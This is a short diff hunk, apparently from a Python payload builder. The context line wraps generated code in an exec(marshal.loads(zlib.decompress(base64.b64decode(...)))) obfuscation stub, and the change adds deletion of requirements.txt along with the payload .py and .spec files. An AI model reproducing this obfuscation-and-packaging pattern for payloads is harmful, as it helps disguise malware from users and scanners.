@@ -322,11 +322,13 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
 
             os.remove(f"{payload_file_name}.py")
             os.remove(f"{payload_file_name}.spec")
+            os.remove('requirements.txt')
         
         except Exception as e:
             print(e)
             os.remove(f"{payload_file_name}.py")
             os.remove(f"{payload_file_name}.spec")
+            os.remove('requirements.txt')
 
 
     # File uploads is working again full
